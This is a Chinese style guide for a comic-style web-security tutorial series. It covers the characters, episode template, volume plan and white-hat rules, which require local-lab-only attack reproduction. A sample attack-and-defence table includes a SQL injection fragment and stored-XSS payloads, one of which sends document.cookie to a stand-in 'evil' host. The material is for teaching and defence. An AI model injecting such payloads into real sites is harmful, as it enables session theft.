## 一、一句话定位与衔接

别人教你把功能"跑起来",这部教你在坏人手里把它**"守下来"**——用一座咖啡站被黑客盯上的故事,把 OWASP Top 10 与认证密码学讲成看得见摸得着的攻防对决。

- **承接**:Java 线 S7 咖啡站上云、CLI 线 C5 服务器安家之后,生意火爆——**然后真的被打了**:评论区被刷屏、订单接口被薅羊毛、后台差点被越权登入。安全第一次从"课本名词"变成"我的站正在流血"。
- **本线核心冲突**:**能跑 ≠ 能扛**。阿零前四线积累的所有"能交付"的自信,在第 1 话被一条 `' OR '1'='1` 击穿。这既是他的翻车来源,也是本线区别于所有安全教程的差异点——**每个漏洞都长在他自己写过的那行代码上**。
- 本线是宇宙三部曲的收口:**建站(Java)→ 运维(CLI)→ 守站(Security)**,把 Java 线埋下的"能跑就行"技术债一次性还清。

## 二、角色表

### 阿穹(Armor)—— 本线导师

- **外形**:一只盾牌犰狳。背甲是一层层**可开合的钛合金鳞片**——纵深防御的拟人化,每片甲对应一道防线,讲课时会"啪"地展开一片给阿零看内部结构。随身别一把**信任边界粉笔**(白垩色,画在地上的线过一夜不消失);腰间挂一只旧式响应寻呼机(退役纪念品,只在卷终响)。
- **来历**:退役自"某跨国 CA 机构安全响应队"。见过太多凌晨三点的事故,所以话少、语速平、从不惊慌。
- **性格**:冷静、爱打比方、**遇险先卷成球把阿零护在里面再讲道理**。不嘲讽阿零的无知,只嘲讽阿零的**侥幸**——"这不可能被攻破"是他唯一会翻脸的句式。
- **口头禅**:「**先假设它已经破了。**」(Assume Breach——每次阿零说"这不可能"时甩出)
- **副口头禅**:「**这层边界,谁画的?**」(逼阿零指出信任边界在哪,再动手改代码)
- **能力边界(硬约束)**:
  - 只管**攻防半径**:威胁建模、漏洞原理、认证授权、密码学与传输、供应链与运行时防护。**不教业务功能怎么写**(归豆豆 / Java 线),**不教服务器基本操作**(归特米),**不教界面**(归薇塔)。
  - **不替阿零打、也不替阿零修**:他只**画边界、给攻击视角、指出该验证什么**;payload 由阿零自己在靶场敲,补丁由阿零自己提交(对应特米"只报命令名不代敲"、薇塔"只报数字不写码")。
  - 排障沿用豆豆五步法,本线特化为**攻防五步**:复现攻击 → 定位信任边界被跨越的那一行 → 提出修复假设 → 只改一个变量 → **重放攻击验证失败**。
  - 绝不给"上个 WAF 就完事"的银弹答案;任何单层方案出现,他必补一句"那这层破了呢?"
- **固定短栏目**(对应 Java 线"豆豆旁白/豆豆锐评"):
  - `> **阿穹画线**:…`(用粉笔标出本段的信任边界在哪、哪些数据跨了线)
  - `> **阿穹锐评**:…`(一句点破本质/踩坑,毒在点上不在嘴上)
  - `> **📋 攻击回放**` + 真实请求/payload 代码块(编译官罚单的本线版:必须是靶场里**真跑得出来**的响应)

### 阿零 —— 读者代理(本线成长弧)

起点:能交付后端系统、能管服务器、能写前端的人,但安全直觉为零——**"没人会来打我这种小站"**。这句话在第 1 话就被打脸,并成为全线的成长起点。

| 卷 | 能力上涨节点 |
|---|---|
| 卷一(1–6) | 从"能跑就行"到会**先问"这条数据从哪来、跨没跨线"**;能自己复现一次注入并写出参数化修复 |
| 卷二(7–15) | 从"登录了就是自己人"到能**分清认证与授权**,自己发现并堵上一处 IDOR |
| 卷三(16–22) | 从"HTTPS 就是绿锁"到能**看懂证书链与握手**,独立完成一次密钥外迁 + 自动续签 |
| 卷四(23–30) | 从"我的代码没问题"到**主导一次威胁建模**,给全站排出修复优先级并写事故复盘 |

翻车素材优先选**前四线的惯性**:Java 线学的字符串拼接直觉拿去拼 SQL;CLI 线学的 `curl` 拿去打自己的内网;前端线学的"前端已经校验过了"当成服务端可以省;运维线学的"内网默认可信"。**阿零不能永远很笨**——每卷至少一次由他先发现问题、阿穹只做确认。

### 客串规则(豆豆 / 特米 / 薇塔 / 技术角色)

- **豆豆**:本线里是**"被保护的资产"兼受害者**。它的固件更新通道 = 供应链攻击(话 23)与密钥管理(话 22)的具体载体;它被刷屏的评论区 = 话 25 防刷实战的同一个场景。豆豆可以抱怨、可以心疼营业额,**但不抢导师职能**——技术讲解一律归阿穹。每卷至少露面一次。
- **特米**:仅在**终端 / 日志 / 服务器**语境客串(定点:话 20 ACME 自动续签、话 27 审计日志)。保留「man 一下」,本线的经典台词是"**man 一下审计日志**";戏份不超过 2 格,不解释基础命令。
- **薇塔**:仅在**浏览器侧防线**语境可选客串(话 04 CSP 与输出编码、话 21 安全响应头),负责"这条策略会不会把页面搞崩"的性能/体验视角。上限 1–2 格,可不上。
- **技术角色**(按需启用,遵守 Java v2「不给每个名词造角色」):
  - **黑影(The Shade)** —— 攻击者的统一化身,不露脸,只有终端里的光标与一行行请求日志。**不是反派剧场式的坏蛋,而是"一个耐心的、自动化的、7×24 的陌生人"**。全线不给他真实身份、不给他动机独白。首登话 01。
  - **信任边界线** —— 阿穹的粉笔线本身就是角色:被跨越时会**发红发烫**。全线视觉母题。
  - **甲片** —— 每修好一类漏洞,阿穹背上多钉一片甲;检查点即"数甲片"。
  - **令牌小人 / 证书官** —— 卷二、卷三按需登场的一次性道具角色,用完即收,不做常驻设定。

> **禁止**:把攻击者写成会说反派台词的角色、把漏洞写成"坏人放的",一切漏洞都必须归因到**阿零自己写下的那一行**。

## 三、每话固定骨架(11 步,继承 Java v2 · 本线改为"攻击先行")

普通话 **3.8k–5.5k 字符**;深度话至多 6k;卷终话 5.5k–6.5k。本线与 Java 线最大的结构差异:第 5–8 段由「改代码→造 Bug→看报错→修复」改为「**复现攻击 → 定位根因 → 打补丁 → 重放验证**」——漏洞不用"故意制造",它本来就在上一话的代码里。

| # | 段落 | 职责 | 量级 |
|---|---|---|---|
| 1 | 事故或需求(承上) | 咖啡站的真实伤口(账单异常/评论区异常/告警),一句接上一话埋的坑 | 150–250 字 |
| 2 | 4–8 格漫画 | 必含"阿零翻车 + 阿穹卷球/画线 + ≥1 技术角色或客串";只承载心智模型/冲突/情绪 | 600–1000 字 |
| 3 | 本话目标 | ≤5 条,动词开头(其中至少一条是"防住 X") | ~100 字 |
| 4 | 威胁模型图 | 本线替代 Java 的"技术原理图":数据流 + **粉笔信任边界线** + 攻击者站在哪一侧 | 400–700 字 |
| 5 | 复现攻击(红队半场) | **在本地靶场**对上一话产物打出这个洞;给出真实请求/payload 与真实响应 | 400–700 字 |
| 6 | 定位根因 | 指到具体那一行:哪个变量跨了边界却没被校验/编码/绑定 | 200–400 字 |
| 7 | 打补丁(蓝队半场) | 从上一话代码继续改,明确"在哪个文件哪段之上加了什么";绝不推倒重来 | 500–900 字 |
| 8 | 重放验证 | Java 线"跑测试"本线放宽为**可验证**:重放同一 payload 失败 / 安全测试用例通过 / `curl -I` 看响应头 / 扫描器复扫零告警——**必须真跑得出,不能编** | 300–500 字 |
| 9 | 🛡️ 攻防推演台 | 本线专属固定栏目,**每话必有**(格式见 §四) | 250–400 字 |
| 10 | 项目检查点 + 对应招聘技能 | 咖啡站现在扛得住什么/还扛不住什么 + 甲片计数;招聘技能不能空 | 150–250 字 |
| 11 | 下一话悬念(启下) | 一句埋坑,与下一话第 1 段能对上 | 50–100 字 |

深度栏目(🔀 / ⏳ / 🎯)按 Java v2 触发规则插在第 4 段后或第 8 段后;**一话最多 2 个(推演台不计入)**,一律表格化,严禁散文注水。

**视觉与命名**:标题 `《从零开始守江山》0x · 本话名`,H1 唯一;首行元信息引用块两行(卷/话定位 + 项目提示);小节用中文数字 `## 一、…` 对齐骨架;漫画分格 `> **〔n〕** 画面描述` + 对白,格间空一行;结尾署名行固定:
`*本话属于连载《从零开始守江山》。世界观见 handbook.md;卷次地图见 /sec。*`

## 四、本线专属深度栏目:🛡️ 攻防推演台(每话必有)

**作用**:把本话知识点拆成"同一个点的矛与盾"——左边红队怎么打,右边蓝队怎么拦。对标 Java 线 🔀 多解台的"同题多解"精神,换成"同题攻防"。34 话连起来 = 一本可以横着读的攻防对照手册。

**位置**:第 9 段,固定;**每话必有,不计入"一话最多 2 个深度栏目"的额度。**

**格式模板**:

```text
> **🛡️ 攻防推演台 · <本话这个点>**
>
> | 回合 | 🔴 红队(黑影会怎么打) | 🔵 蓝队(阿零该怎么拦) |
> |---|---|---|
> | 第一招 | <最朴素的打法 + payload> | <最直接的防线> |
> | 绕过 | <绕过上面那层的变体> | <补上的第二层甲> |
> | 兜底 | <就算前两层都破了> | <把损失关在笼子里的措施> |
>
> 🛡️ 阿穹结论:<一句话给出默认必做项 + 为什么单层不够>。
```

**示例**(话 04《评论区里的幽灵脚本》):

> **🛡️ 攻防推演台 · 存储型 XSS(跨站脚本)**
>
> | 回合 | 🔴 红队(黑影会怎么打) | 🔵 蓝队(阿零该怎么拦) |
> |---|---|---|
> | 第一招 | 评价里贴 `<script>fetch('//evil/?c='+document.cookie)</script>`,谁看菜单谁中招 | 输出到 HTML 上下文时按上下文编码,`<` 变 `&lt;`,浏览器只当字 |
> | 绕过 | 改用 `<img src=x onerror=...>` 绕过只过滤 `<script>` 的黑名单 | 停用黑名单改白名单/富文本净化;属性、URL、JS 三种上下文各用各的编码 |
> | 兜底 | 编码漏了一处,脚本还是执行了 | CSP(内容安全策略)nonce 白名单挡掉内联脚本;Cookie 加 HttpOnly,偷不到会话 |
>
> 🛡️ 阿穹结论:必做的是**输出编码**,CSP 与 HttpOnly 是"编码漏一处时你还剩几条命"。防线只有一层的,叫运气。

**约束**:
- 三行回合是**上限也是节奏**(第一招 / 绕过 / 兜底),不许写成攻击手册长清单;红队栏只写**原理性 payload**,不给可直接投递的完整攻击脚本、不给绕过 WAF 的成品规则。
- 蓝队栏必须**落到本话代码或配置的具体一行**,不许停在"要注意安全"。
- 结论一句话必须点明"哪一层是必做的、哪几层是纵深"。

**其余栏目沿用 Java 线**:
- **🔀 多解台**(本线典型触发):防 CSRF(SameSite / CSRF Token / Origin 校验)、密码哈希算法选型(bcrypt / scrypt / Argon2id)、JWT 签名算法(HS256 / RS256 / ES256)、限流算法(令牌桶 / 漏桶 / 滑动窗口)、越权校验落点(Controller / Service / 数据层行级)。
- **🎯 面试直击**(本线高频区):对称 vs 非对称、JWT 为什么难主动失效、CSRF 与 XSS 区别、加盐防的到底是什么、TLS 握手为什么要非对称、`Access-Control-Allow-Origin: *` 为什么不能配 `credentials`。
- **⏳ 版本时光机**(按需):MD5/SHA1 → bcrypt → Argon2id、TLS 1.0–1.2 → 1.3、OAuth 2.0 → 2.1 草案、OWASP Top 10 2021 → 2025、验证码 → 隐形风控、CVSS 3.1 → 4.0。**主线一律以当前基线写法为准**,时光机只做"为什么老代码长那样"。

## 五、检查点版本链与项目主线(对应 `series-sec.ts` 的 projectStage)

咖啡站在本线不新增业务功能——**它只长甲**。版本链 **v-sec1 → v-sec2 → v-sec3 → v-sec-final**,与 Java 线 v0→v7、CLI 线检查点并列挂进"工程报纸"版本时光轴。

| 卷 | 话 | 卷终版本 | 交付物(咖啡站长成什么样) |
|---|---|---|---|
| 卷一 · 破防:当咖啡站第一次被打 | 1–6 | **v-sec1** | 注入 / XSS / CSRF / SSRF 四类外墙洞封堵,信任边界粉笔线首次画满全图 |
| 卷二 · 门锁:你是谁,你能干嘛 | 7–15 | **v-sec2** | 认证授权全链重做:慢哈希密码、服务端归属校验、令牌短命可撤销、第三方登录走授权码+PKCE、后台多因素门禁 |
| 卷三 · 密语:加密、证书与传输 | 16–22 | **v-sec3** | 全站 HTTPS + HSTS + 自动续签,密钥出代码进托管并可轮换 |
| 卷四 · 城防:供应链、防刷与未来战场 | 23–30 | **v-sec-final** | SBOM + 依赖扫描进 CI、限流与人机识别上线、WAF 与防篡改审计日志、零信任改造、TLS 抗量子混合、AI 客服加护栏 |

**推进规则**:

- **卷终检查点并入该卷最后一话**(话 07 / 17 / 25 / 34)的第 10 段,不额外占话号——全线严格 34 话。卷终话 `chapterType` 用 `project`。
- 每话 `projectStage` 写一句"**现在扛得住什么**"的动词短语(如"注入打不进来了""令牌能撤销了"),与正文第 10 段检查点措辞一致;禁止写成"学会了 XX"——检查点描述**系统状态**,不是学习状态。
- **甲片计数**:每话第 10 段固定一行 `🛡️ 甲片:第 N 片(本话新增:<一句>)`,N 单调递增,与话号同步(话 N = 第 N 片)。卷终话额外一行 `版本链:v-secX 已钉`。
- 代码**从上一话的产物继续长**,文件路径跨话连续;修复必须落在 Java 线 S4–S7 遗留的那套 Spring Boot 咖啡站代码上,**不许为演示新起一个玩具项目**。
- **靶场纪律**:所有攻击复现只在**本地 docker 起的咖啡站副本**(或对照用的 OWASP Juice Shop)进行,正文必须显式写明"本节在本地靶场执行"。见 §七红线。
- 发布节奏同 CLI / 前端线:蓝图全量 `planned` 挂 `lib/series-sec.ts`,每周翻 1 话 `published`(写完当话 md、slug 对齐、当话 status 翻转,三件事同一次提交)。

## 六、依赖铁律(本线 + 跨线)

**本话只能使用"本话或更早话"讲过的概念。** 不得不提前用,只许"最小够用解释 + 标注细节见第 X 话"。**严禁先用后讲**——本线尤其致命:话 03 讲注入时不能顺手甩 JWT,话 10 讲 JWT 时不能默认读者已懂 TLS(那是卷三)。

## 七、写作红线

### 7.1 白帽红线(本线独有,优先级最高)

1. **一切攻击复现只在自有靶场**:本地 docker 咖啡站副本 / OWASP Juice Shop。**严禁**出现针对任何真实第三方站点、真实 IP、真实厂商后台的操作,截图与日志里的域名一律用 `coffee.local` / `example.com`。
2. **payload 只给原理级**:够读者理解"为什么能打进来"即可。**不给**成品攻击脚本、不给 WAF 绕过规则集、不给可直接投递的钓鱼模板、不给任何真实 CVE 的 weaponized exploit(Log4Shell 等历史事故只做**复盘叙述**,不给可运行利用链)。
3. **每卷首话与卷终各出现一次免责提示**,统一写成:
   `> [!警告] 本话所有攻击复现均在本地靶场进行。未经授权对他人系统进行测试是违法行为。`
4. 真实密钥/token/证书私钥**一律用占位符**(`sk-REDACTED`、`-----BEGIN ... REDACTED`),正文与截图都不得出现能用的凭据;演示"泄露"场景时用当场生成后即刻作废的测试密钥,并写明已作废。

### 7.2 版本敏感事实:发布前必须联网复核

安全领域的"当前基线"半年一变——**凡出现在正文的版本号、标准状态(草案/RFC/正式)、默认开关、榜单排名、算法推荐参数,发布当话前必须用 opencode+deepseek(见 `search` 技能)或 context7 复核一次,以复核日期为准,不吃底稿老本。**

**① 底稿遗留 ⚠ 未核实条目(写到对应话前必须先核实,此处原样照录):**

- 「25. **OAuth 2.1(草案整合)** — 收敛 2.0:强制 PKCE、废除隐式流与密码流;⚠仍是 IETF Internet-Draft,尚未成 RFC(见未核实说明)。」(涉及话 12《借别人的钥匙:OAuth》)

### 7.3 术语一致性(全线统一,首次出现括注英文)

- **认证(Authentication / AuthN)** 与 **授权(Authorization / AuthZ)** 严格区分;**禁用"鉴权"** 这个混淆两者的词。
- **哈希(Hash)** 不可逆、**加密(Encryption)** 可逆、**编码(Encoding)** 不是安全措施——禁止说"密码加密存储"(应为"密码哈希存储")、禁止说"Base64 加密"。
- **令牌(Token)** / **会话(Session)** / **凭据(Credential)** 三词不混用;`sessionId` 叫会话标识,不叫"token"。
- **越权** 统一指 Broken Access Control 家族,横向越权特指 **IDOR(不安全的直接对象引用)**;禁止与"未授权访问"混写。
- **信任边界**、**纵深防御**、**最小权限**、**载荷(payload)**、**红队/蓝队** 为全线固定译名,不换说法。
- 缩写首次出现必须展开一次:XSS / CSRF / SSRF / IDOR / JWT / CSP / HSTS / CORS / MFA / TOTP / RBAC / ABAC / SCA / SBOM / KMS / PQC / WAF / STRIDE / CVSS。
- 角色名固定:**阿穹**(不写 Armor 中文别名)、**黑影**(不写"黑客小哥"之类)。

### 7.4 便利贴与折叠语法(沿用既有渲染引擎 `lib/markdown.ts`)

- `> [!文字版]`:漫画分格的文字版容器(无图环境与读屏可读),同 Java 线。
- `> [!吐槽]`:阿穹/豆豆吐槽便利贴(渲染 sticky-grumble)。
- `> [!警告]`:靶场免责与危险操作提示(渲染 sticky-warn)——**本线用量最大的便利贴**。
- `> [!坑]`:等价 sticky-warn,用于"这么写就等着被打"的典型误区。
- `> [!答案]`:折叠块(渲染 details),放练习答案、完整 payload 解析或可跳过的延伸原理。
- `> [!彩蛋]`:结尾冷幽默 / 跨线彩蛋。
- 引用块内可嵌代码围栏(`lib/posts.ts` 已支持),漫画分格里可直接放小段 java / http 请求。
